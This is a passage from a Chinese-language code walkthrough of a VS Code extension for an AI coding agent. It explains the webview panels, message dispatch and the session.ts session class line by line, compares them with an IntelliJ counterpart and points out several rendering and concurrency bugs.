469          row.addEventListener("click", () => vscode.postMessage({ type: "historyOpen", id: entry.id }));
470          row.appendChild(main);
471          row.appendChild(remove);
472          historyList.appendChild(row);
473        }
474      }
475      historyBox.hidden = false;
476    }
```

| 细节 | 行 | 为什么 |
|---|---:|---|
| `historyEntries = ...` 先缓存 | 435 | 搜索框清空时不必再问 Core |
| 空列表文案分两种 | 440 | 区分「没会话」与「搜不到」 |
| `row.title = entry.preview` | 446 | 悬停看首句预览 |
| `stopPropagation()` | 466 | 点「×」不触发整行的「打开」 |
| 搜索命中不显示消息数 | 453-460 | 同一条记录只能显示一种副标题 |

⚠️ **空列表文案看的是搜索框现值，不是本次请求的查询**（440 行）：用户搜「foo」无结果 → 显示「没有匹配」；用户清空搜索框 → 前端本地 `renderHistory(historyEntries)`（L637）恢复列表，此时 `historyEntries` 是**上次搜索的结果**（空），所以会显示出「还没有历史会话」。刷新一次 `历史` 按钮才恢复。

### 6.12 三组面板：记忆候选 / 团队下拉 / 交付物抽屉（478-605 行）

| 函数 | 行 | 作用 | 上行消息 |
|---|---:|---|---|
| `renderMemories()` | 480-512 | 候选列表 + 确认/编辑/忽略 | `memoryResolve` |
| `memoryButton()` | 516-527 | 三态按钮（`false`/`true`/`null`） | 同上 |
| `startMemoryEdit()` | 529-550 | 就地换成 textarea | 同上（带 `content`） |
| `renderTeams()` | 555-571 | 工具栏下拉，永远保留「不启用」 | `teamSelect` |
| `renderArtifacts()` | 575-605 | 黑板一行一条，点击展开正文 | — |

📌 **团队下拉与交付物抽屉是 3.3.0 新增的两块 UI**：它们本身不发 RPC，只是把 `team/list` 与 `team/artifacts` 的结果画出来；真正的请求在 `session.ts` 的 `loadTeams` / `setTeam` / `loadArtifacts`（§7.9）。

```js
480    function renderMemories(items) {
481      memoryItems = Array.isArray(items) ? items : [];
482      memoryBox.textContent = "";
483      if (!memoryItems.length) {
... 空状态 ...
490      }
491      for (const item of memoryItems) {
492        const row = document.createElement("div");
493        row.className = "mrow";
...
500        const meta = document.createElement("div");
501        meta.className = "mmeta";
502        meta.textContent = (item.source === "correction" ? "纠正" : "偏好") + " · " + (item.category || "");
503        const actions = document.createElement("div");
504        actions.className = "mact";
505        actions.appendChild(memoryButton("确认", item, false));
506        actions.appendChild(memoryButton("编辑", item, true));
507        actions.appendChild(memoryButton("忽略", item, null));
508        row.append(title, text, meta, actions);
509        memoryBox.appendChild(row);
510      }
511      memoryBox.hidden = false;
512    }
```

```js
516    function memoryButton(label, item, approve) {
517      const button = document.createElement("button");
518      button.textContent = label;
519      button.addEventListener("click", () => {
520        if (approve === true) {
521          startMemoryEdit(item, button.closest(".mrow"));
522        } else {
523          vscode.postMessage({ type: "memoryResolve", id: item.id, approve: approve === false });
524        }
525      });
526      return button;
527    }
```

第三个参数 `approve` 是一个**三态**：

| 按钮 | 传入值 | 第 520 行分支 | 发出的 `approve` | 语义 |
|---|---|---|---|---|
| 确认 | `false` | 走 else | `approve === false` → `true` | 采纳 |
| 编辑 | `true` | 打开行内编辑 | — | 采纳（带正文） |
| 忽略 | `null` | 走 else | `null === false` → `false` | 丢弃 |

📌 **`null` 与 `false` 在 JS 里不相等**，所以「忽略」确实发的是 `false`。但这个命名极具误导性：参数叫 `approve`，三态里却用 `false` 表示「确认」。

⚠️ **`item.source === "correction"` 永远为假**：Core 侧的两个来源常量是 `user_instruction` 与 `user_correction`（`memory/pending.py:52-53`），`source` 字段直接存这两个值；归属类别才叫 `category: "correction"`。所以 `mmeta` 永远显示「偏好」。**这与 Java 侧 `AgentChatPanel.sourceLabel()`（`"correction".equals(source)`，08 卷 §17.3）是同一个 bug 的两个副本**——两边都在比 `source` 而不是 `category`。

```js
529    function startMemoryEdit(item, row) {
530      row.textContent = "";
531      const area = document.createElement("textarea");
532      area.value = item.content || "";
533      area.rows = 2;
534      area.style.width = "100%";
...
539      save.addEventListener("click", () => {
540        const text = area.value.trim();
541        if (!text) return;
542        vscode.postMessage({ type: "memoryResolve", id: item.id, approve: true, content: text });
543      });
...
546      cancel.addEventListener("click", () => renderMemories(memoryItems));
...
549      area.focus();
550    }
```

📌 **编辑是「就地换行」**：`row.textContent = ""` 把原来的标题/正文/按钮全部清掉，换成 textarea + 保存/取消。取消时**整表重绘**（L546）而不是只恢复这一行——用 5 行代码换掉了「局部回滚」的复杂度。

⚠️ **空正文点「保存」静默无反应**（541 行）：用户删光文字再点保存，什么都不会发生，也没有提示。

### 6.13 输入区与顶部按钮（607-666 行）

```js
607    send.addEventListener("click", () => {
608      const text = input.value.trim();
609      if (!text) return;
610      input.value = "";
611      vscode.postMessage({ type: "send", text });
612    });
613    input.addEventListener("keydown", (event) => {
614      if (event.key === "Enter" && (event.ctrlKey || event.metaKey)) {
615        event.preventDefault();
616        send.click();
617      }
618    });
619    stop.addEventListener("click", () => vscode.postMessage({ type: "stop" }));
```

| 交互 | 行为 |
|---|---|
| 点「发送」 | `trim()` 后清空输入框并 `postMessage` |
| `Ctrl/Cmd + Enter` | 等价于点发送 |
| 单独 `Enter` | **换行**（没拦） |
| 点「停止」 | 发 `{type:"stop"}` |

⚠️ **单 Enter 不发送**：VS Code 里多数聊天面板（Copilot Chat）是 `Enter` 发送、`Shift+Enter` 换行。这里反过来了，而且快捷键与 IntelliJ 侧不一致（Java 的 `ChatComposer` 用 Enter 发送 + Shift+Enter 换行，01 卷 §1.3）——**同一个产品两套键位**。

```js
626        const query = historySearch.value.trim();
627        historyList.textContent = "加载中…";
628        vscode.postMessage(query ? { type: "historySearch", query } : { type: "historyList" });
...
632    historySearch.addEventListener("input", () => {
633      if (historySearchTimer) clearTimeout(historySearchTimer);
634      historySearchTimer = setTimeout(() => {
635        const query = historySearch.value.trim();
636        if (!query) {
637          renderHistory(historyEntries);
638          return;
639        }
640        vscode.postMessage({ type: "historySearch", query });
641      }, 300);
642    });
```

📌 **300 ms 防抖与 IntelliJ 的 `PickerPopup` 完全一致**（08 卷 §12.4 也是 300 ms），都是「清掉旧定时器再建新的」。差异是：Java 用 `javax.swing.Timer`（EDT 上回调），这里用 `setTimeout`（事件循环）。

📌 **空查询走本地恢复**：`renderHistory(historyEntries)` 不经过 Core，所以清空搜索框是**瞬时**的。

### 6.14 消息分派（668-769 行）：14 个 `case` 的真相

```js
668    window.addEventListener("message", (event) => {
669      const message = event.data;
670      switch (message.type) {
671        case "append":
672          if (message.role === "user") {
673            block("user", "你：" + message.text);
674            current = block("assistant", "助手：");
675          } else if (message.role === "assistant") {
676            block("assistant", "助手：" + message.text);
677            current = null;
678          } else {
679            block("system", message.text);
680          }
681          break;
```

| `type` | 行 | 行为 | 触发方 |
|---|---:|---|---|
| `append` | 671-681 | 按角色造气泡 | `appendUser` / `appendSystem` / `appendHistory` |
| `reset` | 682-691 | 清屏 + 清清单 + 收历史/记忆/交付物 | `reset()` |
| `history` | 692-694 | 重绘列表 | `showHistory` |
| `historySearch` | 695-697 | 重绘列表（**忽略 `query`**） | `showHistorySearch` |
| `memory` | 698-700 | 重绘候选 | `showMemories` |
| `teams` | 701-703 | 重绘团队下拉（带 active） | `setTeams` |
| `artifacts` | 704-706 | 重绘交付物抽屉 | `showArtifacts` |
| `delta` | 707-711 | 追加 token | `appendToken` |
| `end` | 712-714 | `current = null` | `finishMessage` |
| `status` | 715-717 | 改状态行 | `setStatus` |
| `todos` | 718-725 | 整表替换 + 自动折叠 | `setTodos` |
| `busy` | 726-732 | 切换发送/停止，并锁住团队下拉 | `setBusy` |
| `confirm` | 733-765 | 造一张内联确认卡（预审 / MCP 两种标题） | `showConfirm` |
| `default` | 766-768 | 丢弃未知类型 | — |

🔁 **与 Java 的 14 路 `onCoreMessage` 分支（08 卷 §17.1）不是同一层**：这里分派的是「面板内部消息」，上游 `session.ts` 才是分派「Core 通知」的那一层（§7.11）。两层之间是 13 个下行方法（§6.4）在做转换。

⚠️ **历史重放会多出空气泡（真实渲染 bug）**：`appendHistory(role, text)`（`session.ts:208-210`）复用 `append` 消息。重放一条「用户→助手」对话时：

1. `role="user"` 走 672-674 行：先画「你：…」，然后 `current = block("assistant", "助手：")` —— **这是一个空气泡**；
2. `role="assistant"` 走 675-677 行：又 `block("assistant", "助手：" + text)` —— **另起一个气泡**，并没有往第 1 步那个空气泡里填。

结果每轮对话都比实际多一行空的「助手：」。修法有两种：`appendHistory` 用独立 `type`，或 assistant 分支判断 `current` 是否为空占位。

⚠️ **`delta` 每次都重写整段文本**（709 行 `current.textContent += message.text`）：浏览器会把整个文本节点替换掉再重新排版。Java 侧 `ChatView.appendAssistantToken` 也做整段重建（08 卷 §15.4），但那是 Swing；在 DOM 里这个代价更高（长回复会看到滚动抖动）。

📌 **`confirm` 卡画在对话流里，不是模态框**（733-765 行）：`log.appendChild(card)`，与 Java 的 `DiffConfirmCard`（模态 `DialogWrapper`，08 卷 §13.2）形成鲜明对比。好处是永不阻塞 UI；坏处是用户可能直接关掉面板，Core 那边只能等 `CONFIRM_TIMEOUT` 超时（`server.py:813`）后按拒绝处理。

---

## 7. `session.ts`（669 行）：一个类顶掉 Java 的 6 个类

`CoreSession` 同时承担了 Java 侧分散在 `AgentCoreService`（进程）+ `AgentChatPanel`（会话/标签）+ `ChatSessionPanel`（协议路由）+ `SessionTabsBar`（历史列表）+ 记忆面板 + 用量展示里的职责。优点是一个人就能看懂全貌，缺点是**没有一处叫『会话』的类**——它靠一个 `sessionId` 字段滚动。

### 7.1 字段与构造器（15-51 行）

```ts
15  export class CoreSession {
16    private connection?: RpcConnection;
17    private currentTaskId: string | null = null;
18    private readonly projectRoot: string;
19    private readonly projectId: string;
20    private readonly toolRunner: ToolRunner;
21    // Read from SecretStorage / env once, then reused for every settings push.
22    // 启动时从加密存储 / 环境变量读一次，之后每次下发复用。
23    private apiKey = "";
24    private readonly keyReady: Promise<void>;
25    // Conversation currently shown; new tabs (and old files) keep their own id.
26    // 当前显示的会话 id；新建会话或重开历史时会更换。
27    private sessionId: string;
28
29    constructor(private readonly context: vscode.ExtensionContext,
30                private readonly panel: ChatPanel) {
31      this.projectRoot = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath ?? process.cwd();
32      this.projectId = createHash("sha1").update(this.projectRoot).digest("hex").slice(0, 12);
33      this.sessionId = this.projectId;
34      this.toolRunner = new ToolRunner(this.projectRoot);
35      this.keyReady = this.loadApiKey();
36      this.panel.setHandlers({ ... });
37    }
```

**八个字段，对应八个生命周期问题**：

| 字段 | 行 | 语义 | 对 Java |
|---|---:|---|---|
| `connection` | 16 | 当前 Core 连接（可能未建） | `AgentCoreService.connection` |
| `currentTaskId` | 17 | 正在跑的任务，**同时充当忙碌锁** | `AgentChatPanel.currentTaskId` |
| `projectRoot` | 18 | 工作区根（只取第一个文件夹） | `project.getBasePath()` |
| `projectId` | 19 | `sha1(projectRoot)[:12]` | `project.getLocationHash()` |
| `toolRunner` | 20 | Shell 侧工具执行器 | `ToolDispatcher` |
| `apiKey` | 23 | 启动时读一次的密钥 | `ModelProfiles.apiKey()` |
| `keyReady` | 24 | 「密钥已就绪」的 Promise | 无（Java 同步读 PasswordSafe） |
| `sessionId` | 27 | 当前对话的文件 id | `AgentChatPanel.openSession()` 里的 `projectId#uuid8` |

⚠️ **两个 Shell 的 `projectId` 算法不同，算出的 id 也不一样**：

| | Java | TypeScript |
|---|---|---|
| 来源 | `project.getLocationHash()`（IDE 内部 hash） | `sha1(projectRoot).slice(0,12)` |
| 同一仓库在两个 IDE 里的结果 | **不同** | **不同** |

因为数据目录是 `~/.agent/data/<projectId>`（`session.ts:84`），所以**同一个项目在 IDEA 里聊过的历史、积累的记忆、建好的语义索引，在 VS Code 里全部看不到**。这是设计选择（各 IDE 独立）还是疏忽，代码里没有注释说明；但 README（§2 全局编号体系）只说「Shell 生成」，没提两端不一致。

📌 **`sessionId` 初值 = `projectId`**（33 行）：所以**第一个会话的文件名就是 projectId 本身**，不带 `#` 后缀。只有点了「新会话」才变成 `${projectId}#${Date.now().toString(36)}`（225 行）。Java 侧首会话也类似（`projectId` 开头），但后缀用 `uuid` 前 8 位、格式固定——Core 不关心格式，两边都能用。

### 7.2 `loadApiKey()`（53-68 行）：失败也不能挡对话

```ts
53    // Migrate a plaintext key on first start; a broken SecretStorage must never
54    // block the chat, so failures fall back to the environment variable.
55    // 首次启动迁移明文 Key；加密存储不可用时退回环境变量，不阻断对话。
56    private async loadApiKey(): Promise<void> {
57      try {
58        const { key, migrated } = await ensureApiKey(this.context);
59        this.apiKey = key;
60        if (migrated) {
61          this.panel.setStatus("已把 API Key 迁移到安全存储");
62        }
63      } catch (error) {
64        this.apiKey = (process.env.OPENAI_API_KEY ?? "").trim();
65        const message = error instanceof Error ? error.message : String(error);
66        this.panel.appendSystem(`[提示] API Key 读取失败（${message}），已退回环境变量`);
67      }
68    }
```

📌 **两层兜底**：`ensureApiKey` 内部已经兜了「加密存储不可用 → 环境变量」（§4.2 分支 C）；这里再兜一层是因为 `context.secrets.get()` 本身可能**抛异常**（如 Linux 上无 keyring）。

⚠️ **迁移提示会被下一次 `setStatus` 覆盖**：构造器在 `activate` 里同步执行，`loadApiKey` 是异步的；而 `activate` 紧接着就调 `ensureStarted()` → `keyReady` 完成后立刻 `setStatus("正在启动 Agent Core...")`（`session.ts:113`）。两条 `setStatus` 的先后顺序取决于微任务调度，**用户很可能看不到「已迁移」这句提示**。

### 7.3 `ensureStarted()`（70-114 行）：唯一的启动入口

```ts
70    async ensureStarted(): Promise<void> {
71      if (this.connection?.isAlive()) {
72        return;
73      }
74      await this.keyReady;
75      const executable = locateCoreExe(this.context);
76      const python = locatePython();
77      const coreHome = locateCoreHome(this.context);
78      if (!executable && !coreHome) {
79        throw new Error("未找到 core 目录或打包好的 Core。请设置 agentCoder.coreHome 或 AGENT_CORE_HOME");
80      }
81      if (!executable && !python) {
82        throw new Error("未找到 Python（需 3.9+）。请设置 agentCoder.pythonPath 或 AGENT_PYTHON");
83      }
84      const dataDir = join(homedir(), ".agent", "data", this.projectId);
85      const connection = new RpcConnection({ executable, python, coreHome, projectId: this.projectId, dataDir });
92      connection.on("notification", (message: RpcMessage) => this.onNotification(message));
93      connection.on("stderr", (chunk: string) => {
94        if (chunk.toLowerCase().includes("traceback")) {
95          this.panel.appendSystem(chunk.trim().slice(0, 400));
96        }
97      });
98      connection.on("exit", (code: number | null) => {
99        this.panel.setBusy(false);
100        this.panel.setStatus(`Core 已退出（${code ?? "?"}）`);
101        this.panel.appendSystem("[系统] Agent Core 已退出，可执行 “Agent: 重启 Agent Core”。");
102      });
103      this.connection = connection;
104      // ``team`` promises the Core that this shell can render the pre-review card;
105      // without it the Core falls back to one confirmation per write.
106      // team 表示本 Shell 能渲染预审卡；不声明时 Core 会退化成逐次确认。
107      connection.notify("ide/hello", {
108        protocolVersion: "1.0",
109        ide: "vscode",
110        capabilities: ["ask-user", "team"],
111      });
112      connection.notify("settings/update", collectSettings(this.apiKey));
113      this.panel.setStatus("正在启动 Agent Core...");
114    }
```

**它是幂等的**：71 行先查 `isAlive()`，已在跑就直接返回。所以 `send`、`loadHistory`、`loadMemories`、`loadTeams` 都可以无脑先调它（它们都通过 `connected()`，`session.ts:379-387`）。

📌 **`stderr` 只显示含 `traceback` 的块**（94-96 行）：Python 的日志（`logging` 默认走 stderr）会把大量 INFO 打印进来，全显示会淹没对话。

⚠️ **`stderr` 的分块可能截断关键词**：`data` 回调是流式的，`"Traceback"` 很可能被切成 `"Trace"` + `"back"` 两个 chunk。两个 chunk 都不含完整的 `traceback`，于是**整段堆栈被丢掉**。Java 侧 `CoreProcess` 的做法不同（01 卷 §2.2：按行读后再判断），所以 Java 不会漏。

✅ **`ide/hello` 现在带了 `capabilities`**（107-111 行）：`["ask-user", "team"]`。两个值都对应 Core 侧的一段分支：

```python
856    async def _ask_via_shell(self, questions: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
857        if "ask-user" not in self._shell_capabilities:
858            LOGGER.info("ask_user skipped: shell did not advertise ask-user")
859            return None
```

（`rpc/server.py:856-859`）

- **`ask-user`**：缺了它 `ask_user` 工具直接返回 `None`，模型只能「带着假设继续」（Core 注释原话）。Java 侧也在 `AgentCoreService.java:187` 声明了同一个值，两壳一致。
- **`team`**：表示本壳能渲染**预审卡**（`agent/confirm` 的 `kind: "preapprove"`，`server.py:804`）；不声明时 Core 会退化成「每次写入都单独确认」。IntelliJ 同样声明了 `team`，所以两壳的 `capabilities` 完全对齐。

📌 **这是 3.2 修掉的一个真实能力缺口**：早期 VS Code 只发 `{protocolVersion, ide}`，于是 `ask/user` / `ask/withdraw` 两个通知根本不会发出。现在它们会到达，但 `onNotification` 里仍没有对应分支（§7.11 的五个未处理通知）——**能力声明与 UI 实现不同步**：Core 会真的弹提问卡并等 `ASK_TIMEOUT`（1800 s）才降级。相对 IntelliJ，VS Code 壳还差两处渲染：**思考行**（`chat/reasoning`）与**提问卡**（`ask/user`）。

⚠️ **启动顺序：`settings/update` 先于 `core/hello`**（107-112 行）。Core 的 `core/hello` 通知在进程启动时就发了（`server.py` 里 start 阶段），壳收到后还会**再推一次**设置（`pushSettings()`，`session.ts:408`）。所以设置实际发了两次，这是幂等的。

### 7.4 `send()`（116-149 行）：整个壳的入口

```ts
116    async send(text: string): Promise<void> {
117      if (!text.trim() || this.currentTaskId) {
118        return;
119      }
120      try {
121        await this.ensureStarted();
122      } catch (error) {
123        this.panel.appendSystem(`[错误] ${error instanceof Error ? error.message : String(error)}`);
124        return;
125      }
126      const connection = this.connection;
127      if (!connection) {
128        return;
129      }
130      this.panel.appendUser(text);
131      this.panel.setBusy(true);
132      this.panel.setStatus("思考中...");
133      try {
134        const response = await connection.request("chat/start", {
135          sessionId: this.sessionId,
136          message: text,
137          contextSnapshot: this.snapshot(),
138        });
139        const taskId = response.result?.taskId;
140        if (typeof taskId === "string") {
141          this.currentTaskId = taskId;
142        }
143      } catch (error) {
144        this.panel.appendSystem(`[错误] ${error instanceof Error ? error.message : String(error)}`);
145        this.panel.finishMessage();
146        this.panel.setBusy(false);
147        this.panel.setStatus("出错");
148      }
149    }
```

**七步流程**（与 Java `ChatSessionPanel.sendMessage` 一一对应，01 卷 §1.4）：

| 步 | 行 | 动作 | 失败时 |
|---|---:|---|---|
| 1 | 117 | 空文本/已有任务 → 丢弃 | 静默 |
| 2 | 121 | 确保 Core 在跑 | 写系统提示并返回 |
| 3 | 130 | 画用户气泡（带预建助手气泡） | — |
| 4 | 131-132 | 置忙 + 状态「思考中...」 | — |
| 5 | 134-138 | `chat/start` 三个参数 | — |
| 6 | 139-142 | 记下 `taskId` | 字段缺失则不记 |
| 7 | 143-148 | 请求级异常 → 清场并提示 | — |

📌 **`contextSnapshot` 只有两个字段**（`snapshot()`，543-550 行）：

```ts
543    private snapshot(): Record<string, unknown> {
544      const snapshot: Record<string, unknown> = { project_root: this.projectRoot };
545      const editor = vscode.window.activeTextEditor;
546      if (editor && editor.document.uri.scheme === "file") {
547        snapshot.current_file = editor.document.uri.fsPath;
548      }
549      return snapshot;
550    }
```

🔁 Java 侧 `buildContextSnapshot()`（08 卷 §17.3）除了 `project_root` / `current_file` 还会送 `open_files`（用户附件的绝对路径）。VS Code **没有附件功能**，所以只送当前文件。Core 的 `ContextSnapshot` 对缺字段宽容（`protocol.py`），不会被拒。

⚠️ **`currentTaskId` 的赋值晚于「忙碌锁」的生效**：`setBusy(true)` 先发（131），而 `currentTaskId` 要等 `chat/start` 的响应回来才设（141）。这中间有一个往返窗口，若用户在这期间再次触发 `send`（例如命令面板里的「生成日报」），`117` 行的检查**拦不住**，会发出第二个 `chat/start`。

真实发生概率很低（发送按钮已被 `busy` 置灰），但命令面板/快捷键不受按钮状态约束。修法：在 131 行之前先设一个 `sending` 标志。

### 7.5 `stop()`（151-153 行）：一个 `{}` 的语义

```ts
151    stop(): void {
152      this.connection?.notify("chat/cancel", this.currentTaskId ? { taskId: this.currentTaskId } : {});
153    }
```

Core 侧：

```python
883    def _cancel(self, task_id: Optional[str]) -> None:
884        if task_id:
885            task = self._tasks.get(task_id)
886            if task:
887                task.cancel()
888            return
889        for task in list(self._tasks.values()):
890            task.cancel()
```

（`rpc/server.py:883-890`）

📌 **`{}` 等于「取消所有任务」**。在 VS Code 里只有一个会话，所以结果等价；但如果扩展未来支持多标签，这一行会变成「停一个，全停」。

⚠️ **`stop()` 不改 UI 状态**：不置忙、不改状态行，完全依赖 Core 回一条 `chat/error`（`code: CANCELLED`）来清场（`session.ts:475-483`）。若 `chat/cancel` 在 Core 已死时发出，`notify` 会静默失败（`rpc.ts:129-131`），按钮就一直卡在「停止」。

### 7.6 `pushSettings()` 与 `connectionOrNull()`（155-166 行）

```ts
155    pushSettings(): void {
156      void this.keyReady.then(() => {
157        this.connection?.notify("settings/update", collectSettings(this.apiKey));
158      });
159    }
160
161    // Live connection for callers that only read (inline completion); undefined
162    // while the Core is down keeps typing free of prompts.
163    // 供只读调用方（行内补全）使用的连接；Core 未就绪时返回 undefined，输入不受影响。
164    connectionOrNull(): RpcConnection | undefined {
165      return this.connection?.isAlive() ? this.connection : undefined;
166    }
```

📌 **`connectionOrNull` 与 `connection` 的区别就在于 `isAlive()`**：前者是「能用才给」，后者是「不管死没死」。行内补全只能拿前者（`extension.ts:14`），因为它在每次敲键时都会被调用，**不能因为一个死连接报错**。

### 7.7 历史四件套（168-275 行）

#### `loadHistory()`（172-183 行）

```ts
173      const connection = await this.connected();
174      if (!connection) {
175        return;
176      }
177      try {
178        const response = await connection.request("session/list", {});
179        this.panel.showHistory(toEntries(response.result?.sessions));
180      } catch (error) {
181        this.panel.appendSystem(`[错误] 读取历史失败：${describe(error)}`);
182      }
```

#### `openSession()`（187-216 行）

```ts
191      if (this.currentTaskId) {
192        this.panel.appendSystem("\n  [提示] 当前任务还在跑，先停止再切换会话。");
193        return;
194      }
195      const connection = await this.connected();
196      if (!connection) {
197        return;
198      }
199      try {
200        const response = await connection.request("session/get", { sessionId: id });
201        const result = response.result ?? {};
202        this.sessionId = id;
203        this.panel.reset();
204        for (const item of asArray(result.messages)) {
205          const text = String(item.content ?? "");
206          if (text.trim()) {
207            this.panel.appendHistory(String(item.role ?? ""), text);
208          }
209        }
210        this.panel.setTodos(toTodos(result.todos));
211        this.panel.appendSystem("\n  已载入历史会话（已保存在本机），可以接着聊。");
212        this.panel.setStatus("就绪");
213      } catch (error) {
214        this.panel.appendSystem(`[错误] 打开历史会话失败：${describe(error)}`);
215      }
216    }
```

四步：拉详情 → 换 `sessionId` → 清屏重放 → 恢复清单。

📌 **先 `request` 成功才换 `sessionId`（202 行）**：失败时当前会话不变，不会把用户困在一个不存在的会话里。

📌 **`text.trim()` 过滤空消息（206 行）**：对话里有系统提示或工具中间态时，Core 里可能存在空内容条目。

⚠️ **这里就是 §6.14 那个「空气泡」 bug 的触发点**：`appendHistory` 传入的 `role` 是 `"user"` / `"assistant"`，前端 `append` 分支会为 `user` 预建一个空的助手气泡，而后续 `assistant` 又另起一个。**重开任何历史会话都能复现。**

#### `newSession()`（218-228 行）

```ts
218    private newSession(): void {
219      if (this.currentTaskId) {
220        this.panel.appendSystem("\n  [提示] 当前任务还在跑，先停止再新建会话。");
221        return;
222      }
223      // The timestamp keeps a new conversation from overwriting an old file.
224      // 带时间戳的新 id，避免新建会话覆盖已有历史。
225      this.sessionId = `${this.projectId}#${Date.now().toString(36)}`;
226      this.panel.reset();
227      this.panel.setStatus("新会话（不继承其它会话的上下文）");
228    }
```

📌 **`Date.now().toString(36)`** 得到 `m3k9x2` 这种短串。同一毫秒内点两次会得到同一个 id，但人类点击速度不可能。

📌 **不调后端**：新会话只是换 id，**Core 里没有「创建会话」这个 RPC**——会话文件是在第一次 `chat/start` 时由 Core 惰性创建的。这与 `session/store.py` 的 `get_or_create` 对应（07 卷 §2）。

#### `deleteSession()`（230-256 行）

```ts
234      const answer = await vscode.window.showWarningMessage(
235        "删除这条历史会话？本机文件会一并删除，无法恢复。", { modal: true }, "删除");
236      if (answer !== "删除") return;
...
244        const response = await connection.request("session/delete", { sessionId: id });
245        const freed = Number(response.result?.freedBytes ?? 0);
246        if (id === this.sessionId) {
247          this.newSession();
248        }
249        // Say how much disk the delete actually reclaimed.
250        // 告诉用户这次删除真正释放了多少磁盘。
251        this.panel.setStatus(`已删除历史会话${freed > 0 ? `（释放 ${formatSize(freed)}）` : ""}`);
252        await this.loadHistory();
```

📌 **`modal: true`**：VS Code 不加这个选项，警告会以非模态通知出现，用户可以直接忽略。删除是不可逆操作，必须模态。

📌 **`id === this.sessionId` 时先 `newSession()`（246-248）**：删除当前会话后必须换 id，否则下一条消息会**重建一个同名文件**，用户会觉得「删了又回来了」。

📌 **`freedBytes`** 来自 Core（`session/delete` 返回 `{deleted, freedBytes}`，`server.py:282-289`），`formatSize`（661-669 行）分 B/KB/MB 三档。

#### `searchHistory()`（260-275 行）

```ts
261      if (!query.trim()) {
262        await this.loadHistory();
263        return;
264      }
...
270        const response = await connection.request("session/search", { query, limit: 20 });
271        this.panel.showHistorySearch(toSearchEntries(response.result?.results), query);
```

📌 **`limit: 20` 写死在壳里**：Core 的 `_handle_request` 也默认 20（`server.py:291`），两边一致但没有共用常量。

### 7.8 记忆两件套（279-321 行）

```ts
279    private async loadMemories(): Promise<void> {
280      const connection = await this.connected();
281      if (!connection) {
282        return;
283      }
284      try {
285        const response = await connection.request("memory/pending", {});
286        this.panel.showMemories(toMemories(response.result?.items));
287      } catch (error) {
288        this.panel.appendSystem(`[错误] 读取记忆候选失败：${describe(error)}`);
289      }
290    }
```

```ts
294    private async resolveMemory(id: string, approve: boolean, content?: string): Promise<void> {
...
303        if (approve) {
304          const params: Record<string, unknown> = { id };
305          if (content) {
306            params.content = content;
307          }
308          const response = await connection.request("memory/promote", params);
309          const result = response.result ?? {};
310          const duplicate = result.duplicate as Record<string, unknown> | undefined;
311          this.panel.setStatus(`已记住：${String(result.title ?? "")}`
312            + (duplicate ? `（与已有记忆 #${String(duplicate.id)} 相似，建议整理）` : ""));
313        } else {
314          await connection.request("memory/discard", { id });
315          this.panel.setStatus("已忽略这条记忆候选");
316        }
317        await this.loadMemories();
```

| 动作 | RPC | 返回字段 | UI 反馈 |
|---|---|---|---|
| 确认 | `memory/promote` | `title`、可选 `duplicate` | 状态行「已记住：X（与 #Y 相似）」 |
| 忽略 | `memory/discard` | `discarded`、`remaining` | 状态行「已忽略」 |
| 编辑后保存 | `memory/promote` + `content` | 同上 | 同上 |

📌 **每次处理完都重新拉列表（317 行）**：不做局部删除，保证与 Core 一致——`memory/promote` 可能触发去重合并（07 卷 §4.3），本地算不准。

🔁 Java 侧的 `PendingMemory` 面板（`AgentChatPanel`）也是「处理完重新拉」，但**它把 `source` 当类别用**（08 卷 §17.3 的 bug），而 VS Code 的 `resolveMemory` 只关心 `id/approve/content`，没有这个 bug——同一个后端，两个前端，一个错一个不错。

### 7.9 团队三件套（323-375 行）

```ts
328    private async loadTeams(): Promise<void> {
329      const connection = await this.connected();
...
334        const response = await connection.request("team/list", {});
335        const teams = toTeams(response.result?.teams);
336        const active = teams.find((team) => team.active)?.name ?? "";
337        this.panel.setTeams(teams, active);
```

| 方法 | 行 | RPC | 行为 |
|---|---:|---|---|
| `loadTeams()` | 328-341 | `team/list` | 把名册交给 `setTeams(teams, active)`；Core 未答复前下拉只有「不启用」 |
| `setTeam()` | 345-360 | 无（写配置后 `pushSettings()`） | 把 `activeTeam` 存进 Workspace 配置再下发 `settings/update`；状态行「已启用团队：X」/「已停用团队：写操作逐次确认」 |
| `loadArtifacts()` | 364-375 | `team/artifacts` | 按会话拉黑板，交给 `showArtifacts` |

📌 **团队开关走的是配置，不是 RPC**：`setTeam` 只做三件事——写 `agentCoder.activeTeam`、`pushSettings()`、刷新名册。Core 侧 `_apply_settings` 认 `active_team` 字段（`server.py:457-466`），所以「切团队」与「换模型」是同一条通道。

📌 **`core/hello` 一收到就读名册**（406-412 行）：名册由 Core 维护，壳不缓存；`setTeam` 结束也会再 `loadTeams()` 一次，保证下拉里的 `active` 与 Core 一致。

⚠️ **交付物只在「打开抽屉」时拉**：`chat/artifact` 通知只往时间线写一行（§7.11），前端不缓存全文；重开历史会话后抽屉里看到的是 `team/artifacts` 的回放（`server.py:311-320`）。

### 7.10 三个收尾方法（379-399 行）

```ts
379    private async connected(): Promise<RpcConnection | undefined> {
380      try {
381        await this.ensureStarted();
382      } catch (error) {
383        this.panel.appendSystem(`[错误] ${describe(error)}`);
384        return undefined;
385      }
386      return this.connection;
387    }
388
389    async restart(): Promise<void> {
390      this.connection?.dispose();
391      this.connection = undefined;
392      this.currentTaskId = null;
393      await this.ensureStarted();
394    }
395
396    dispose(): void {
397      this.connection?.dispose();
398      this.connection = undefined;
399    }
```

📌 **`connected()` 是「启动 + 取连接」的合体**：四个历史/记忆方法都走它，所以**点「历史」也能把一个没启动的 Core 拉起来**。

📌 **`restart()` 先 `dispose()` 再 `ensureStarted()`**：`dispose()` 只是 `kill()`，不等进程退出（§2.6），所以新旧进程可能短暂并存。

⚠️ **`restart()` 不重置 `panel` 的状态**：若重启前正在「思考中...」，`restart` 不清 busy；新 Core 不会为旧任务发任何 `chat/finish`，于是界面**永久停在忙碌态**。手动重启前应该先 `setBusy(false)`。

### 7.11 `onNotification()`（403-521 行）：14 个分支完整表

```ts
403    private onNotification(message: RpcMessage): void {
404      const params = message.params ?? {};
405      switch (message.method) {
```

| `method` | 行 | 动作 | Core 侧产生处 |
|---|---:|---|---|
| `core/hello` | 406-412 | 状态「就绪」+ 再推设置 + 读团队名册 | `server.py:182` |
| `session/indexProgress` | 413-417 | 状态行提示建会话索引 | `server.py:363-370` |
| `memory/pendingChanged` | 418-424 | 状态行提示有新候选 | `memory/service.py`（`server.py:698`） |
